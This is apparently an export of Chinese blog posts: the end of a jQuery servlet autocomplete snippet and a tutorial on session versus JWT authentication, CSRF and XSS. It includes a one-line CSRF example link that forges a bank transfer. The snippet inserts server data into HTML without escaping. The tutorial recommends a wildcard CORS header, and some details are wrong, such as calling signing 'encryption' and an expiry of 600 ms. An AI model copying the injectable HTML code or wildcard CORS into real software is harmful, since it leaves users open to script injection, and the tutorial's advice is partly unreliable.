class="string">&quot;none&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//由于浏览器的缓存机制所以我们每次传入一个时间</span></span><br><span class="line">        <span class="keyword">var</span> time = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">&quot;get&quot;</span>,</span><br><span class="line">            <span class="comment">//新建一个名为SearchNameAjaxServlet的servlet,URL如下</span></span><br><span class="line">            url: <span class="string">&quot;searchNameAjax&quot;</span>,</span><br><span class="line">            data: &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: content,</span><br><span class="line">                <span class="string">&quot;time&quot;</span>: time</span><br><span class="line">            &#125;,<span class="comment">//&quot;info=&quot;+content+&quot;&amp;time=&quot;+time</span></span><br><span class="line">            dataType: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                <span class="comment">//拼接html</span></span><br><span class="line">                <span class="comment">//var res = data.split(&quot;,&quot;);</span></span><br><span class="line">                <span class="keyword">var</span> html = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">                    <span class="comment">//每一个div还有鼠标移出、移入点击事件</span></span><br><span class="line">                    html += <span class="string">&quot;&lt;div onmousedown=&#x27;setSearch_onclick(this)&#x27; onmouseout=&#x27;changeBackColor_out(this)&#x27; onmouseover=&#x27;changeBackColor_over(this)&#x27;&gt;&quot;</span></span><br><span class="line">                        + data[i].name + <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                $(<span class="string">&quot;#context1&quot;</span>).html(html);</span><br><span class="line">                <span class="comment">//显示为块级元素</span></span><br><span class="line">                $(<span class="string">&quot;#context1&quot;</span>).css(<span class="string">&quot;display&quot;</span>, <span class="string">&quot;block&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//鼠标移到到内容上</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">changeBackColor_over</span>(<span class="params">div</span>) </span>&#123;</span><br><span class="line">        $(div).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;#CCCCCC&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//鼠标离开内容</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">changeBackColor_out</span>(<span class="params">div</span>) </span>&#123;</span><br><span class="line">        $(div).css(<span class="string">&quot;background-color&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">&quot;#searchName&quot;</span>).blur(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">&quot;#context1&quot;</span>).css(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;none&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Servlet</tag>
      </tags>
  </entry>
  <entry>
    <title>授权认证</title>
    <url>/2020/12/17/%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81/</url>
    <content><![CDATA[<h1 id="1、Session认证"><a href="#1、Session认证" class="headerlink" title="1、Session认证"></a>1、Session认证</h1><blockquote>
<p>存在的问题：</p>
<ul>
<li>Session: 每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大</li>
<li>扩展性: 用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力</li>
<li>CSRF: 因为是基于<strong>cookie</strong>来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</li>
</ul>
</blockquote>
<p><img src="https://csn.damyoung.cn/2018121020091479.png" alt="微服务存在问题"></p>
<h2 id="http无状态协议"><a href="#http无状态协议" class="headerlink" title="http无状态协议"></a>http无状态协议</h2><p>web应用采用B/S架构，http作为通信协议。http是无状态协议，浏览器每一次发送的请求服务器都会独立处理，不与之前或之后的请求产生联系。</p>
<a id="more"></a>

<p>这也同时意味着，任何用户都能通过浏览器访问服务器资源，如果想保护服务器的某些资源，必须限制浏览器请求；要限制浏览器请求，必须鉴别浏览器请求，响应合法请求，忽略非法请求；要鉴别浏览器请求，必须清楚浏览器请求状态。</p>
<h2 id="会话机制"><a href="#会话机制" class="headerlink" title="会话机制"></a>会话机制</h2><p>既然http协议无状态，那就需要服务器和浏览器共同维护一个状态，这就是会话机制。<strong>使得第一次登陆请求与之后的请求产生联系。</strong></p>
<p>浏览器第一次请求服务器，服务器创建一个会话，并将会话的 id 作为响应的一部分发送给浏览器，浏览器存储会话 id，并在后续第二次和第三次请求中带上会话 id，服务器取得请求中的会话 id 就知道是不是同一个用户了（登录的用户在 session 里面是可以查询到已经存储的 isLogin 属性设置为 true），这个过程用下图说明，后续请求与第一次请求产生了关联</p>
<p><img src="https://csn.damyoung.cn/20190309191511382.png" alt="会话机制"></p>
<h2 id="登陆状态"><a href="#登陆状态" class="headerlink" title="登陆状态"></a>登陆状态</h2><p>有了会话机制，登录状态就好明白了，假设浏览器第一次请求服务器需要输入用户名与密码验证身份，服务器拿到用户名密码去数据库比对，正确的话说明当前持有这个会话的用户是合法用户，应该将这个会话<strong>标记</strong>为“已授权”或者“已登录”等等之类的状态，既然是会话的状态，自然要保存在会话对象中，tomcat 在会话对象中设置登录状态如下</p>
<p>每次请求受保护资源时都会检查会话对象中的登录状态，只有 <code>isLogin=true</code> 的会话才能访问，登录机制因此而实现</p>
<p><img src="https://csn.damyoung.cn/20190309192358290.png" alt="Tomcat登录状态"></p>
<h2 id="保存Session-Id"><a href="#保存Session-Id" class="headerlink" title="保存Session Id"></a>保存Session Id</h2><ul>
<li>服务器在内存中保存会话对象</li>
<li>浏览器保存会话 id 有两种方式<ul>
<li>请求参数</li>
<li>通过cookie实现</li>
</ul>
</li>
</ul>
<p>将会话 id 作为每一个请求的参数，服务器接收请求自然能解析参数获得会话 id，并借此判断是否来自同一会话，很明显，这种方式不靠谱。</p>
<p>另外的方法是让浏览器自己来维护这个会话 id，每次发送 http 请求时浏览器自动发送会话 id，cookie 机制正好用来做这件事。cookie 是浏览器用来存储少量数据的一种机制，数据以<code>key/value</code>形式存储，浏览器发送 http 请求时自动附带 cookie 信息</p>
<h2 id="禁用Session"><a href="#禁用Session" class="headerlink" title="禁用Session"></a>禁用Session</h2><p>一般是通过 Cookie 来保存 SessionID ，假如使用了 Cookie 保存 SessionID的方案的话， 如果客户端禁用了Cookie，那么Seesion就无法正常工作。</p>
<p>但是，并不是没有 Cookie 之后就不能用 Session 了，比如可以将 SessionID 放在请求的 url 里面<code>https://javaguide.cn/?session_id=xxx</code> 。这种方案的话可行，但是安全性和用户体验感降低。当然，为了安全也可以对 SessionID 进行一次加密之后再传入后端</p>
<h1 id="2、JWT认证"><a href="#2、JWT认证" class="headerlink" title="2、JWT认证"></a>2、JWT认证</h1><blockquote>
<p>JWT，是TOKEN的一种形式，TOKEN说简单了，就是一个秘钥(随机数）。以往的TOKEN，你拿到之后要获取 用户信息，需要再去数据库匹配查询，而JWT干脆将用户信息存储在了TOKEN里，你解析就可以获得。</p>
</blockquote>
<blockquote>
<p><strong>防止CSRF攻击</strong></p>
<p>csrf攻击利用了浏览器在请求域相同时,会携带相同cookie,达到攻击目的.从这个角度想,我们防止csrf攻击可以,我们可以额外添加一个token身份验证,因为token不是cookie,恶意网站没有办法拿到token放到请求中.服务端接受请求时去判断cookie和token是否正确,双管齐下.</p>
</blockquote>
<p>在基于 <code>Token</code> 进行身份验证的的应用程序中，服务器通过 <code>Payload</code>、<code>Header</code>和一个密钥(<code>secret</code>)创建令牌（<code>Token</code>）并将 <code>Token</code> 发送给客户端，客户端将 <code>Token</code> 保存在 <code>Cookie</code> 或者 <code>localStorage</code> 里面，以后客户端发出的所有请求都会携带这个令牌。可以把它放在 <code>Cookie</code> 里面自动发送，<strong>但是这样不能跨域</strong>，所以更好的做法是<strong>放在 <code>HTTP Header</code> 的 <code>Authorization</code>字段中</strong>： <code>Authorization: Bearer Token</code>。流程如下：</p>
<ol>
<li>用户向服务器发送用户名和密码用于登陆系统。</li>
<li>身份验证服务响应并返回了签名的 JWT，上面包含了用户是谁的内容。</li>
<li>用户以后每次向后端发请求都在Header中带上 JWT。</li>
<li>服务端检查 JWT 并从中获取用户相关信息。</li>
</ol>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SON Web Token（JWT）是一个开放的行业标准（RFC 7519），它定义了一种简介的、自包含的<strong>协议格式</strong>，用于在通信双方传递json对象，传递的信息经过数字签名可以被验证和信任。JWT可以使用 HMAC算法或使用RSA的公钥/私钥对来签名，防止被篡改。</p>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>JWT令牌的优点： </p>
<ol>
<li>jwt基于json，非常方便解析。 </li>
<li>可以在令牌中自定义丰富的内容，易扩展。 </li>
<li>通过非对称加密算法及数字签名技术，JWT防止篡改，安全性高。</li>
<li>资源服务使用JWT可不依赖认证服务即可完成授权。 </li>
</ol>
<p>缺点： JWT令牌较长，占存储空间比较大。</p>
<h3 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h3><p>在HTML5中，新加入了一个localStorage特性，这个特性主要是用来作为本地存储来使用的，解决了cookie存储空间不足的问题</p>
<p>1、localStorage拓展了cookie的4K限制</p>
<p>2、localStorage会可以将第一次请求的数据直接存储到本地，这个相当于一个5M大小的针对于前端页面的数据库，相比于cookie可以节约带宽，但是这个却是只有在高版本的浏览器中才支持的</p>
<p>在我们登录成功获得 token 之后，一般会选择存放在 local storage 中。然后我们在前端通过某些方式会给每个发到后端的请求加上这个 token</p>
<h2 id="基于token的鉴权机制"><a href="#基于token的鉴权机制" class="headerlink" title="基于token的鉴权机制"></a>基于token的鉴权机制</h2><p>基于<strong>token</strong>的鉴权机制类似于http协议也是<strong>无状态</strong>的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。</p>
<p>这个token必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持CORS(跨来源资源共享)策略，一般我们在服务端这么做就可以了Access-Control-Allow-Origin: *。</p>
<h2 id="JWT基本原理"><a href="#JWT基本原理" class="headerlink" title="JWT基本原理"></a>JWT基本原理</h2><blockquote>
<p>jwt的构成非常简单，字节占用很小，所以它是非常便于传输的</p>
</blockquote>
<p>JWT 实际上是一个字符串，中间用点<code>.</code>分割成三部分，三部分分别如下：</p>
<ul>
<li>Header（头部）</li>
<li>Payload（负载）</li>
<li>Signature（签名）</li>
</ul>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>Header 部分是一个 JSON 对象，描述的是JWT的元数据,表示的是 JSON 对象的签名和加密。其主要参数有以下这些，除了<code>alg</code>算法参数外，其他选项都是可选的。</p>
<ul>
<li><strong>alg</strong> 算法 (必选项)</li>
<li><strong>typ</strong> 类型 (如果是 JWT 那么就带有一个值 JWT，如果存在的话)</li>
<li><strong>kid</strong> 密钥 ID</li>
<li><strong>cty</strong> 内容类型</li>
<li><strong>jku</strong> JWK 指定 URL</li>
<li><strong>jwk</strong> JSON 网络值</li>
<li><strong>x5u</strong> X.509 URL</li>
<li><strong>x5c</strong> X.509 证书链</li>
<li><strong>x5t</strong> X.509 证书 SHA-1 指纹</li>
<li><strong>x5t#S256</strong> X.509 证书 SHA-256 指纹</li>
<li><strong>crit</strong> 临界值</li>
</ul>
<p>通常常用格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>对其进行Base64URL编码后就得到JWT的头部（Header）</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure>

<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>Payload 部分同样是一个JSON对象，用来存放实际需要传递的数据，JWT规定了7个官方字段供使用：</p>
<ul>
<li><strong>sub</strong>:该JWT所面向的对象的值（唯一），可以用来鉴别用户</li>
<li><strong>iat</strong>(issued at):在什么时候签发的token</li>
<li><strong>exp</strong>(expires):token什么时候过期</li>
<li><strong>nbf</strong>(not before):token在此时间之前不能被接收处理,表示什么时间开始生效</li>
<li><strong>jti</strong>:JWT ID为web token提供唯一标识</li>
<li><strong>iss</strong>:该JWT的签发者</li>
<li><strong>aud</strong>:受众，用来确认令牌的可能接收者的字符串数值。</li>
</ul>
<p>后面三个参数通常是在更复杂的情况下(例如包含多个发行者时)才被使用。</p>
<p>除了官方字段，还可以在这个部分定义私有字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;sub&quot;:&quot;112345567&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;SilverBullet Ming&quot;,</span><br><span class="line">    &quot;admin&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样<strong>将上面的JSON对象进行base64URL编码后得到的字符串就是JWT的载荷</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yJzdWIiOiIxIiwiaXNzIjoiaHR0cDpcL1wvbG9jYWx</span><br><span class="line">ob3N0OjgwMDFcL2F1dGhcL2xvZ2luIiwiaWF0IjoxNDUxODg4MTE5LCJleHAiOjE0NTQ1MTYxMTksIm5iZiI6MTQ1MTg4OD</span><br><span class="line">ExOSwianRpIjoiMzdjMTA3ZTQ2MDlkZGJjYzljMDk2ZWE1ZWU3NmM2NjcifQ</span><br></pre></td></tr></table></figure>

<h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><blockquote>
<p>Signature 部分是对前两部分的签名，防止数据被修改。</p>
</blockquote>
<p>将头部和载荷编码后的字符串用<code>.</code>连接在一起后（头部在前），将拼接完的字符串用 H256 算法进行加密，同时提供了一个密钥（<code>secret</code>）就得到了签名。</p>
<p><strong>secret</strong> 是保存在服务器端的， jwt 的签发生成也是在服务器端的，secret 就是用来进行 jwt 的签发和 jwt 的验证，所以，它就是你<strong>服务端的私钥</strong>，在任何场景都不应该流露出去。一旦客户端得知 这个 secret , 那就意味着客户端是可以自我签发 jwt 了</p>
<p>按照下面的公式产生签名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">    base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">    base64UrlEncode(payload),</span><br><span class="line">    secret</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>加密后的签名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wyoQ95RjAyQ2FF3aj8EvCSaUmeP0KUqcCJDENNfnaT4</span><br></pre></td></tr></table></figure>

<p>将得到的三部分字符串拼接在一起后就得到了JWT</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.</span><br><span class="line">eyJzdWIiOiIxIiwiaXNzIjoiaHR0cDpcL1wvbG9jYWxob3N0OjgwMDFcL2F1dGhcL2xvZ2luIiwiaWF0IjoxNDUxODg4MTE5LCJleHAiOjE0NTQ1MTYxMTksIm5iZiI6MTQ1MTg4ODExOSwianRpIjoiMzdjMTA3ZTQ2MDlkZGJjYzljMDk2ZWE1ZWU3NmM2NjcifQ.</span><br><span class="line">wyoQ95RjAyQ2FF3aj8EvCSaUmeP0KUqcCJDENNfnaT4</span><br></pre></td></tr></table></figure>



<h2 id="JWT特点"><a href="#JWT特点" class="headerlink" title="JWT特点"></a>JWT特点</h2><ol>
<li>JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。</li>
<li>JWT 不加密的情况下，不能将秘密数据写入 JWT。</li>
<li>JWT 不仅可以用于认证，也可以用于<strong>交换信息</strong>。有效使用 JWT，可以降低服务器查询数据库的次数。</li>
<li>JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，<strong>一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑</strong>。</li>
<li>JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</li>
<li>为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输</li>
</ol>
<p>服务端会验证token，如果验证通过就会返回相应的资源。整个流程就是这样的:</p>
<p><img src="https://csn.damyoung.cn/20181210201752159.png" alt="在这里插入图片描述"></p>
<p><img src="https://csn.damyoung.cn/20181210201942951.png" alt="在这里插入图片描述"></p>
<h2 id="注销登录Token仍然有效"><a href="#注销登录Token仍然有效" class="headerlink" title="注销登录Token仍然有效"></a>注销登录Token仍然有效</h2><blockquote>
<p>类似的场景还有：</p>
<ul>
<li>退出登录;</li>
<li>修改密码;</li>
<li>服务端修改了某个用户具有的权限或者角色；</li>
<li>用户的帐户被删除/暂停；</li>
<li>用户由管理员注销</li>
</ul>
</blockquote>
<p>这个问题不存在于 Session 认证方式中，因为在 Session 认证方式中，遇到这种情况的话服务端<strong>删除对应的 Session 记录</strong>即可。但是，使用 token 认证的方式就不好解决了。</p>
<p>解决方案有以下几种：</p>
<ul>
<li><p><strong>将 token 存入内存数据库</strong>：将 token 存入 DB 中，redis 内存数据库在这里是是不错的选择。如果需要让某个 token 失效就直接从 redis 中删除这个 token 即可。但是，这样会导致每次使用 token 发送请求都要先从 DB 中查询 token 是否存在的步骤，而且违背了 JWT 的无状态原则。</p>
</li>
<li><p><strong>黑名单机制</strong>：和上面的方式类似，使用内存数据库比如 redis 维护一个黑名单，如果想让某个 token 失效的话就直接将这个 token 加入到黑名单即可。然后，每次使用 token 进行请求的话都会先判断这个 token 是否存在于黑名单中。</p>
</li>
<li><p><strong>修改密钥</strong>：为每个用户都创建一个专属密钥secret盐，如果我们想让某个 token 失效，我们直接修改对应用户的密钥即可。但是，这样相比于前两种引入内存数据库带来了危害更大</p>
<ul>
<li>如果服务是分布式的，则每次发出新的 token 时都必须在多台机器<strong>同步密钥</strong>。为此，你需要将必须将机密存储在数据库或其他外部服务中，这样和 Session 认证就没太大区别了。</li>
<li><strong>多端问题</strong>，如果用户同时在两个浏览器打开系统，或者在手机端也打开了系统，如果它从一个地方将账号退出，那么其他地方都要重新进行登录，这是不可取的。</li>
</ul>
</li>
<li><p><strong>保持令牌的有效期限短并经常轮换</strong>：很简单的一种方式。但是，会导致用户登录状态不会被持久记录，而且需要用户经常登录。</p>
</li>
</ul>
<p>修改密码：</p>
<p>对于修改密码后 token 还有效问题的解决还是比较容易的，说一种比较好的方式：<strong>使用用户的密码的哈希值对 token 进行签名。因此，如果密码更改，则任何先前的令牌将自动无法验证。</strong></p>
<h2 id="Token续签问题"><a href="#Token续签问题" class="headerlink" title="Token续签问题"></a>Token续签问题</h2><p>在 Session 认证中一般的做法：假如 session 的有效期30分钟，如果 30 分钟内用户有访问，就把 session 有效期被延长30分钟。</p>
<ol>
<li><strong>类似于 Session 认证中的做法</strong>：这种方案满足于大部分场景。假设服务端给的 token 有效期设置为30分钟，服务端每次进行校验时，如果发现 token 的有效期马上快过期了，服务端就重新生成 token 给客户端。客户端每次请求都检查新旧token，如果不一致，则更新本地的 token。这种做法的问题是仅仅在快过期的时候请求才会更新 token ,对客户端不是很友好。</li>
<li><strong>每次请求都返回新 token</strong>：这种方案的的思路很简单，但是，很明显，开销会比较大。</li>
<li><strong>token 有效期设置到半夜</strong> ：这种方案是一种折衷的方案，保证了大部分用户白天可以正常登录，适用于对安全性要求不高的系统。</li>
<li><strong>用户登录返回两个 token</strong>：第一个是 <code>acessToken</code> ，它的过期时间是 token 本身的过期时间比如半个小时，另外一个是 <code>refreshToken</code> 它的过期时间更长一点比如为1天。客户端登录后，将 <code>accessToken</code>和 <code>refreshToken</code> 保存在本地，每次访问将 <code>accessToken</code> 传给服务端。服务端校验 <code>accessToken</code> 的有效性，如果过期的话，就将 <code>refreshToken</code> 传给服务端。如果有效，服务端就生成新的 <code>accessToken</code> 给客户端。否则，客户端就重新登录即可。该方案的不足是:</li>
</ol>
<ul>
<li>需要客户端来配合；</li>
<li>用户注销的时候需要同时保证两个 token 都无效；</li>
<li>重新请求获取 token 的过程中会有短暂 token 不可用的情况（可以通过在客户端设置定时器，当 <code>accessToken</code> 快过期的时候，提前去通过 <code>refreshToken</code> 获取新的 <code>accessToken</code>）。</li>
</ul>
<h2 id="JJWT"><a href="#JJWT" class="headerlink" title="JJWT"></a>JJWT</h2><p>JJWT是一个<strong>提供端到端的JWT创建和验证的Java库</strong>。永远免费和开源(Apache License，版本2.0)，JJW 很容易使用和理解。它被设计成一个以建筑为中心的流畅界面，隐藏了它的大部分复杂性。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--jjwt依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="JJWT生成与解析"><a href="#JJWT生成与解析" class="headerlink" title="JJWT生成与解析"></a>JJWT生成与解析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JwtBuilder jwtBuilder = Jwts.builder()</span><br><span class="line">      <span class="comment">//唯一id&#123;&quot;id&quot;: &quot;888&quot;&#125;</span></span><br><span class="line">      .setId(<span class="string">&quot;888&quot;</span>)</span><br><span class="line">      <span class="comment">//接收的用户&#123;“sub”:&quot;Rose&quot;&#125;</span></span><br><span class="line">      .setSubject(<span class="string">&quot;Rose&quot;</span>)</span><br><span class="line">      <span class="comment">//签发时间&#123;“iat&quot; : “ ”&#125;</span></span><br><span class="line">      .setIssuedAt(<span class="keyword">new</span> Date())</span><br><span class="line">      <span class="comment">//签名算法及密钥</span></span><br><span class="line">      .signWith(SignatureAlgorithm.HS256, <span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">     <span class="comment">//失效时间</span></span><br><span class="line">	 .setExpiration(<span class="keyword">new</span> Date(System.currentTimeMillis() + (<span class="number">60</span> * <span class="number">10</span>)));;</span><br><span class="line">String token = jwtBuilder.compact();</span><br><span class="line">System.out.println(token);</span><br><span class="line"></span><br><span class="line">String[] split = token.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">Arrays.stream(split).forEach(s-&gt;&#123;</span><br><span class="line">   System.out.println(Base64Codec.BASE64.decodeToString(s));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//解析token,获取claims,jwt中荷载声明的对象</span></span><br><span class="line">Claims claims=(Claims)Jwts.parser()</span><br><span class="line">      <span class="comment">//密钥</span></span><br><span class="line">      .setSigningKey(<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">      .parse(token)</span><br><span class="line">      .getBody();</span><br><span class="line">System.out.println(<span class="string">&quot;id&quot;</span>+claims.getId());</span><br><span class="line">System.out.println(<span class="string">&quot;sub&quot;</span>+claims.getSubject());</span><br><span class="line">System.out.println(<span class="string">&quot;iat&quot;</span>+claims.getIssuedAt());</span><br></pre></td></tr></table></figure>



<h1 id="3、JWT认证的优势"><a href="#3、JWT认证的优势" class="headerlink" title="3、JWT认证的优势"></a>3、JWT认证的优势</h1><p>相比于Session认证方面来说，使用token进行身份认证有下面三个优势：</p>
<h2 id="无状态"><a href="#无状态" class="headerlink" title="无状态"></a>无状态</h2><p>token 自身包含了身份验证所需要的所有信息，使得服务器不需要存储Session信息，这增加了系统的可用性和伸缩性，减轻了服务器的压力。</p>
<p>但是，由于 token 无状态，也导致了它最大的缺点：<strong>当后端在 token 有有效期内废弃了一个 token 或者更改它的权限的话，不会立即生效，一般需要等到有效期过后才可以</strong>。另外，当用户 logout 的话，token 也仍然有效。除非在后端增加额外的逻辑处理。</p>
<h2 id="有效避免了CSRF攻击"><a href="#有效避免了CSRF攻击" class="headerlink" title="有效避免了CSRF攻击"></a>有效避免了CSRF攻击</h2><p><strong>CSRF（Cross Site Request Forgery)</strong> 被称为<strong>跨站请求伪造</strong>，属于网络攻击领域范围。相比于 SQL 脚本注入、XSS 等等安全攻击方式，CSRF 知名度较低。</p>
<p>CSRF 是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了 web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p>
<p>例如：</p>
<p>小壮登录了某网上银行，他来到了网上银行的帖子区，看到一个帖子下面有一个链接写着“科学理财，年盈利率过万”，小壮好奇的点开了这个链接，结果发现自己的账户少了10000元。这是这么回事呢？原来黑客在链接中藏了一个请求，这个请求直接利用小壮的身份给银行发送了一个转账请求,也就是通过你的 Cookie 向银行发出请求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a src&#x3D;http:&#x2F;&#x2F;www.mybank.com&#x2F;Transfer?bankId&#x3D;11&amp;money&#x3D;10000&gt;科学理财，年盈利率过万&lt;&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>进行 Session 认证的时候，我们一般使用 Cookie 来存储 SessionId,当我们登陆后后端生成一个SessionId 放在 Cookie 中返回给客户端，服务端通过 Redis 或者其他存储工具记录保存着这个Sessionid，客户端登录以后每次请求都会带上这个 SessionId，服务端通过这个 SessionId 来标示你这个人。如果别人通过 cookie 拿到了 SessionId 后就可以代替你的身份访问系统了。</p>
<p>Session 认证中 Cookie 中的 SessionId 是由浏览器发送到服务端的，借助这个特性，攻击者就可以通过让用户误点攻击链接，达到攻击效果。</p>
<p>但是，我们使用 token 的话就不会存在这个问题，在我们登录成功获得 token 之后，一般会选择存放在 <strong>local storage</strong> 中。<strong>然后我们在前端通过某些方式会给每个发到后端的请求加上这个 token,这样就不会出现 CSRF 漏洞的问题</strong>。因为，即使有个你点击了非法链接发送了请求到服务端，这个非法请求是不会携带 token 的，所以这个请求将是非法的。</p>
<p>需要注意的是不论是 Cookie 还是 token 都无法避免跨站脚本攻击（Cross Site Scripting）XSS。</p>
<blockquote>
<p>XSS:用户在浏览网站、使用即时通讯软件、甚至在阅读电子邮件时，通常会点击其中的链接。攻击者通过在链接中插入恶意代码，就能够盗取用户信息。攻击者通常会用十六进制（或其他编码方式）将链接编码，以免用户怀疑它的合法性。网站在接收到包含恶意代码的请求之后会产成一个包含恶意代码的页面，而这个页面看起来就像是那个网站应当生成的合法页面一样。许多流行的留言本和论坛程序允许用户发表包含HTML和javascript的帖子。假设用户甲发表了一篇包含恶意脚本的帖子，那么用户乙在浏览这篇帖子时，恶意脚本就会执行，盗取用户乙的session信息。</p>
</blockquote>
<p>可以选择将 token 存储在标记为 <code>httpOnly</code> 的cookie 中。但是，这样又导致了必须自己提供CSRF保护。</p>
<p>具体采用哪种方式需要是具体情况而定。大部分情况下存放在 <code>local storage</code> 下都是最好的选择，某些情况下可能需要存放在标记为 <code>httpOnly</code> 的cookie 中会更好。</p>
<h2 id="适合移动端应用"><a href="#适合移动端应用" class="headerlink" title="适合移动端应用"></a>适合移动端应用</h2><p>使用 Session 进行身份认证的话，需要保存一份信息在服务器端，而且这种方式会依赖到 Cookie（需要 Cookie 保存 SessionId），所以不适合移动端。</p>
<p>但是，使用 token 进行身份认证就不会存在这种问题，因为只要 token 可以被客户端存储就能够使用，而且 <strong>token 还可以跨语言使用。</strong></p>
<h2 id="单点登录友好"><a href="#单点登录友好" class="headerlink" title="单点登录友好"></a>单点登录友好</h2><p>使用 Session 进行身份认证的话，实现单点登陆，需要我们把用户的 Session 信息保存在一台电脑上，并且还会遇到常见的 Cookie 跨域的问题。但是，使用 token 进行认证的话， <strong>token 被保存在客户端</strong>，不会存在这些问题。</p>
